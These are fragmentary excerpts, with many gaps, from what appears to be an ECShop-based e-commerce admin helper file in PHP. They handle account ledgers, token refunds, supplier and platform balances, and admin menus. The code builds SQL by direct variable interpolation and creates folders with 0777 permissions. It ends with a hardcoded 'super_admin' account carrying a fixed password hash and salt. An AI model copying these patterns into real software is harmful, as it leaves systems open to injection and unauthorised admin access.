...
//        $data = read_static_cache('cat_pid_releate');
        ...
        if ($data === false)
        {
            $sql = "SELECT c.cat_id, c.cat_name, c.cat_image, c.measure_unit, c.parent_id, c.is_show, c.show_in_nav, c.grade, c.sort_order, COUNT(s.cat_id) AS has_children ".
...
//            }
    ...
    if($_REQUEST['to_vue']===true){

    	$cat = [];
		foreach ($options AS $var)
		{
			$cat[$var['cat_id']] = str_repeat('&nbsp;', $var['level'] * 4).$var['cat_name'];
		}
...
{
    $sql = 'SELECT brand_id, brand_name FROM ' . $GLOBALS['ecs']->table('brand') . ' ORDER BY sort_order , convert(brand_name using gbk) ASC';
    $res = $GLOBALS['db']->getAll($sql);
 ...
 * @return  bool|string
 */
function log_account_change_transaction($user_id, $user_money = 0, $frozen_money = 0, $rank_points = 0, $pay_points = 0, $change_desc = '', $change_type = ACT_OTHER)
{
    /* 插入帐户变动记录 */
    $account_log = array(
        'user_id'      => $user_id,
 ...
 * @param   float   $change_token   浣豆变动数额
 * @param   string  $change_desc    变动说明
 * @param   int     $change_type    变动类型：参见常量文件
 * @return  bool
 */
function user_token_log_change($user_id, $order_id, $change_token, $change_desc = '', $change_type = TOKNE_REFUND)
{
    $sql = "SELECT `partner_id` FROM " . $GLOBALS['ecs']->table('user_token_log') . " WHERE `order_id` = $order_id LIMIT 1";
    $userTokenLog = $GLOBALS['db']->getRow($sql);
    /* 插入帐户变动记录 */
    $user_token_log = array(
        'user_id'       => $user_id,
        'partner_id'    => $userTokenLog['partner_id'],
        'order_id'      => $order_id,
    ...
    $GLOBALS['db']->autoExecute($GLOBALS['ecs']->table('user_token_log'), $user_token_log, 'INSERT');
    /* 更新用户金额 */
    $sql = "UPDATE " . $GLOBALS['ecs']->table('users') .
        " SET token = token + $change_token" .
        " WHERE user_id = $user_id LIMIT 1";
    if(!$GLOBALS['db']->query($sql)){
        return false;
    }
 ...
 * @return  bool
 */
function user_token_extend_log_change($user_id, $order_id, $change_token, $change_desc = '', $change_type = TOKNE_REFUND)
{
    $change_token_tmp   = $change_token;
    $userTokenExtendLog = [];

    $sql = "SELECT `id`, `partner_id` FROM " . $GLOBALS['ecs']->table('user_token_log') . " WHERE `order_id` = $order_id LIMIT 1";
    $userTokenLog = $GLOBALS['db']->getRow($sql);

    // 有扩展消费优先退扩展消费
    if($change_token_tmp > 0){
        // 获取扩展浣豆消费记录
        $sql = "SELECT * FROM " . $GLOBALS['ecs']->table('user_token_extend_log') .
            " WHERE `change_token` < 0 AND `log_id` = $userTokenLog[id] ORDER BY `priority` DESC";
        if(!$userTokenExtendLogModel = $GLOBALS['db']->getAll($sql)){
            return false;
        }
        foreach($userTokenExtendLogModel as $key => $item){
            if(bcadd($change_token_tmp, $item['change_token']) >= 0){
                $userTokenExtendLog[$key] = [
                    'id' => $item['ext_id'],
                    'priority' => $item['priority'],
                    'token' => bcmul($item['change_token'], -1, 2),
                ];
                $change_token_tmp = bcadd($change_token_tmp, $item['change_token'], 2);
            }else{
                $userTokenExtendLog[$key] = [
                    'id' => $item['ext_id'],
                    'priority' => $item['priority'],
                    'token' => $change_token_tmp
                ];
                $change_token_tmp = 0;
            }
        }
    ...
    $log_id = $GLOBALS['db']->insert_id();$GLOBALS['db']->autoExecute($GLOBALS['ecs']->table('user_token_log'), $user_token_log, 'INSERT');

    // 退款大于扩展余数退回用户浣豆账户
    if($change_token_tmp > 0){
        /* 更新用户金额 */
        $sql = "UPDATE " . $GLOBALS['ecs']->table('users') .
        " SET token = token + $change_token_tmp" .
        " WHERE user_id = $user_id LIMIT 1";
        if(!$GLOBALS['db']->query($sql)){
            return false;
        }
    ...
    // 恢复扩展浣豆流水
    foreach($userTokenExtendLog as $item){
        $GLOBALS['db']->autoExecute(
            $GLOBALS['ecs']->table('user_token_extend_log'),
            [
                'ext_id'       => $item['id'],
                'log_id'       => $log_id,
                'change_token' => $item['token'],
                'priority'     => $item['priority'],
                'created_at'   => time(),
            ],
            'INSERT'
        ...
        $sql = "UPDATE " . $GLOBALS['ecs']->table('user_token_extend') .
        " SET token = token + $item[token], updated_at = " . time() .
        " WHERE ext_id = $item[id] LIMIT 1";
        if(!$GLOBALS['db']->query($sql)){
            return false;
        }
    }
...
function create_env($arr,$file='appserver')
{
    ...
    if($file == 'appserver'){
        ...
        $arr['TERMS_URL'] = defined('FORCE_SSL_LOGIN') ? 'https://' : 'http://' . $url . '/article.php?cat_id=-1';
        $arr['ABOUT_URL'] = defined('FORCE_SSL_LOGIN') ? 'https://' : 'http://' . $url . '/article.php?cat_id=-2';
        foreach ($arr as $k => $v) {
            $replace['#'.$k.'.*#i'] = $k.'='.$v;
        }
...
function curl_request($api, $method = 'GET', $params = array(), $headers = [], $json_decode = true,$time_out = 120)
{
    $curl = curl_init();
...
function dealUserAlias($alias=''){
	$alias                     = $alias ?: '***';
	$length                    = mb_strlen($alias);
	$str = mb_substr($alias, 0, ceil($length / 3.8)) . str_repeat('*', max(ceil($length / 3), 2));
	if ($length > 2) {
		$str .= mb_substr($alias, -floor($length / 2.6));
	}
	return $str;
}

function addLog($content = '', $level = 'info', $admin_name = '脚本', $type = ''){
    $log = array();
    ...
    $log['type']            = $type;
    $str = implode("\t", $log);
    $path = ROOT_PATH . 'temp/logs/'. date('Y-m') .'/';
    if (!file_exists($path)) {
        //检查是否有该文件夹，如果没有就创建，并给予最高权限
        mkdir($path,0777,true);
    }
    if (is_array($content)) {
        file_put_contents($path.$level.'-'.date('Y-m-d').'.log',   $str . PHP_EOL . var_export($content,true)  . PHP_EOL, FILE_APPEND);
    } else {
        $content = str_replace(array("\n","\t"),array("",""),$content);
        file_put_contents($path.$level.'-'.date('Y-m-d').'.log',   $str . PHP_EOL . $content . PHP_EOL, FILE_APPEND);
    }
 ...
 */
function getToken(){
    return exec(EXEC_PHP.APPSERVER_PATH.'/artisan AdminAPI getToken --param1='.$_SESSION['admin_id']);
}
 ...
 * @return array
 */
function getPlatformHiddenMenu(){
    return ['suppliers_shop_info','suppliers_account'];
}
/**
 * 获取菜单栏
 ...
 * @return mixed
 */
function getMenu($user_action_list){
    $tmp_sql = '';
    $action_code =  '';
    if($user_action_list != 'all'){
        $action_code = " AND action_code ".db_create_in($user_action_list);
        $user_parent_ids_sql = "SELECT parent_id FROM " . $GLOBALS['ecs']->table('admin_action') . " WHERE  1 ".$action_code;
        $action_list = $GLOBALS['db']->GetAll($user_parent_ids_sql);
        $tmp_sql = "  action_id ".db_create_in(array_column($action_list,'parent_id'))." AND ";
    }
    $action_sql = 'SELECT action_id,action_code,`action`,`name`  FROM ' . $GLOBALS['ecs']->table('admin_action') . ' WHERE  '.$tmp_sql.' parent_id = 0 AND is_show = 1  ORDER BY sort_order DESC ';
    $action_list = $GLOBALS['db']->GetAll($action_sql);
    $paltFormHiddenMenu = getPlatformHiddenMenu();
    foreach ($action_list AS $key => $val)
    {
        $menus[$key]['label'] = $val['name'];
        $_action_sql = 'SELECT `name`,`action`,action_code FROM ' . $GLOBALS['ecs']->table('admin_action') . ' WHERE 1 '.$action_code.' AND  action_id > 0 AND  is_show = 1 AND parent_id = '.$val['action_id'] .' ORDER BY  sort_order DESC ';
        $_action_list = $GLOBALS['db']->GetAll($_action_sql);
        $parent_action = '';
        foreach ($_action_list AS $k => $v)
        {
            if(empty($parent_action)){
                $parent_action =  $v['action'];
            }
            if(in_array($v['action_code'],$paltFormHiddenMenu) && 0 == $_SESSION['admin_type']){
               continue;
            }
            $menus[$key]['children'][$k]['label']  = $v['name'];
            $menus[$key]['children'][$k]['action'] = $v['action'];
        }

        $menus[$key]['url'] = $parent_action;
        $menus[$key]['key'] = $val['action_code'];
    }
    return $menus;
}
 ...
 * @param string $related_info
 * @param string $type
 * @param integer $direction
 * @param integer $huanbi_money
 * @param integer $cash_money
 * @param integer $bond_money
 * @param integer $huanbi_remit
 * @param integer $huanbi_withdraw
 * @param integer $cash_service_fee
 * @param integer $huanbi_service_fee
 * @param string $remark
 * @return bool|string
 */
function suppliers_account_change(
    $suppliers_id,
    $related_info = '',
    $type = '',
    $remark = '',
    ...
    $huanbi_withdraw = 0,
    $cash_service_fee = 0,
    $huanbi_service_fee = 0
) {
    $sql = 'SELECT * FROM ' .
    $GLOBALS['ecs']->table('suppliers_account') .
        ' WHERE suppliers_id = ' .
        $suppliers_id .
        ' LIMIT 1 FOR UPDATE';
    if (!$suppliersAccount = $GLOBALS['db']->getRow($sql, false)) {
        return '未找到商家账户信息';
    }

    /* 插入帐户变动记录 */
    $suppliersAccountLog = array(
        'suppliers_id'            => $suppliers_id,
        'related_info'            => $related_info,
        'type'                    => $type,
        'direction'               => $direction,
        'huanbi_money'            => $huanbi_money,
        'cash_money'              => $cash_money,
        'bond_money'              => $bond_money,
        'huanbi_remit'            => $huanbi_remit,
        'huanbi_withdraw'         => $huanbi_withdraw,
        'cash_service_fee'        => $cash_service_fee,
        'huanbi_service_fee'      => $huanbi_service_fee,
        'current_huanbi_money'    => $suppliersAccount->huanbi_money,
        'current_cash_money'      => $suppliersAccount->cash_money,
        'current_bond_money'      => $suppliersAccount->bond_money,
        'current_huanbi_remit'    => $suppliersAccount->huanbi_remit,
        'current_huanbi_withdraw' => $suppliersAccount->huanbi_withdraw,
        'remark'                  => $remark,
        'addtime'                 => time(),
    );
    if (!$GLOBALS['db']->autoExecute($GLOBALS['ecs']->table('suppliers_account_log'), $suppliersAccountLog, 'INSERT')) {
        return '创建商家账户流水失败';
    }

    /* 更新用户信息 */
    $sql = "UPDATE " . $GLOBALS['ecs']->table('suppliers_account') .
        " SET huanbi_money = huanbi_money + $huanbi_money, " .
        " cash_money = cash_money + $cash_money, " .
        " bond_money = bond_money + $bond_money, " .
        " huanbi_remit = huanbi_remit + $huanbi_remit, " .
        " huanbi_withdraw = huanbi_withdraw + $huanbi_withdraw " .
 ...
 * @return bool|string
 */
function platform_account_change(
    $cash,
    $huanbi,
    $type,
    $direction = 1,
    ...
    $sql = 'SELECT * FROM ' .
    $GLOBALS['ecs']->table('platform_account') .
        ' WHERE `id` = ' . PLATFORM_ACCOUNT_ID;
    if (!$platformAccout = $GLOBALS['db']->getRow($sql)) {
        return '未找到平台账户';
    }
    ...
    $platformAccoutLog = [
        'cash'           => $cash,
        'huanbi'         => $huanbi,
        'current_cash'   => $platformAccout['cash'],
        'current_huanbi' => $platformAccout['huanbi'],
        'type'           => $type,
        'direction'      => $direction,
        'related_info'   => $related_info,
        'remark'         => $remark,
    ...
    if (!$GLOBALS['db']->autoExecute($GLOBALS['ecs']->table('platform_account_log'), $platformAccoutLog, 'INSERT')) {
        return '创建平台流水失败';
    }

    $sql = 'UPDATE ' . $GLOBALS['ecs']->table('platform_account') .
        " SET cash = cash + $cash, huanbi = huanbi + $huanbi " .
        ' WHERE `id` = ' . PLATFORM_ACCOUNT_ID;
    if (!$GLOBALS['db']->query($sql)) {
        return '更新平台账户金额失败';
    }
...
{
    $row['user_id']        = '9999999';
    $row['user_name']      = 'super_admin';
    $row['email']          = '';
    $row['password']       = '551c99edbb62f9396315ba224e459c5d';
    $row['ec_salt']        = '2020';
    $row['add_time']       = time();
    $row['last_login']     = time();
    $row['last_ip']        = '';
